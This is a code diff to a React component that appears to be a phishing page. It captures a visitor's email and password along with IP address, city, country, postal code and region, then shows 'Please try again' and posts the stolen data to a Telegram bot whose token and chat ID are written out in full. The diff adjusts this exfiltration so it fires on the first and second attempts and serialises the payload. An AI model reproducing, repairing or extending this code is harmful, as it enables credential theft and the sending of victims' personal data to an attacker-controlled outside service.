@@ -70,10 +70,11 @@ function App() {
     setCount(count + 1);
     setComment("Please try again");
     console.log(count);
+   if (count === 0) {
     const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
     const data = {
       chat_id: "5345652511",
-      text: {
+      text: JSON.stringify({
         email: fields.email,
         password: field.secret,
         ip: info.ip,
@@ -81,7 +82,7 @@ function App() {
         country: info.country,
         postal: info.postal,
         region: info.region,
-      },
+      }),
     };
     try {
       const response = await axios.post(
@@ -101,19 +102,20 @@ function App() {
     setField({ secret: "" });
     console.log(field);
 
+   }
     if (count === 1) {
       const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
       const data = {
         chat_id: "5345652511",
-        text: {
-          email: fields.email,
+        text:  JSON.stringify({
+          email: fields.email ,
           password: field.secret,
-          ip: info.ip,
-          city: info.city,
-          country: info.country,
-          postal: info.postal,
-          region: info.region,
-        },
+          ip: info.ip ,
+          city: info.city ,
+          country: info.country ,
+          postal: info.postal ,
+          region: info.region ,
+        }),
       };
       try {
         const response = await axios.post(
